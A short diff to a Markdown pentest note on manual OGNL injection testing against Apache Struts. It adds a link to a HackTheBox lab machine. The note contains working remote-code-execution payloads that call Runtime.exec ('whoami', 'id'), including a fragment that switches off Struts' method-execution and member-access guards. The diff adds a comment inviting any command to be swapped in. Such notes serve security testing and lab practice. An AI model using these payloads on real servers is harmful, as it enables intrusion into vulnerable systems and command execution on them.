@@ -1,7 +1,7 @@
 # Manual Testing
 
 1.  %{1+1}
-2.  %{@java.lang.Runtime@getRuntime().exec('whoami')}
+2.  %{@java.lang.Runtime@getRuntime().exec('whoami')}    //change command as per needed
 
 Look for:
   1. Application crashes
@@ -38,3 +38,6 @@ Look for:
           (#context['xwork.MethodAccessor.denyMethodExecution']=false).
           (#_memberAccess=#dm).
           (@java.lang.Runtime@getRuntime().exec('id'))} "
+
+# For Lab You Can Check HackTheBox Machine
+https://app.hackthebox.com/machines/Strutted
